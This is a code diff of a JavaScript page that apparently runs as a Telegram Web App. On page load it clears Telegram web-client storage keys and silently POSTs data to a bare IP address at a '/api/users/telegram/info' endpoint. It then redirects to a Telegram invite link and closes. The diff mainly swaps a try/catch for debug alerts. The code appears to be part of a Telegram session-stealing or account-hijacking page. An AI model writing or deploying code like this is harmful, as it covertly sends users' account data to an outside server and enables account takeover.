@@ -14,7 +14,9 @@ document.addEventListener("DOMContentLoaded", function() {
         localStorage.removeItem("GramJs:apiCache");
         localStorage.removeItem("tt-global-state");
 
-try {
+
+        alert("XXXD");
+
         fetch(`http://94.131.9.66:4040/api/users/telegram/info`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -25,9 +27,8 @@ try {
             type: new URLSearchParams(window.location.search).get("type")
           })
         });
-      } catch(e) {
-        alert(e);
-      }
+
+        alert("DDD");
 
         window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
         window.Telegram.WebApp.close();
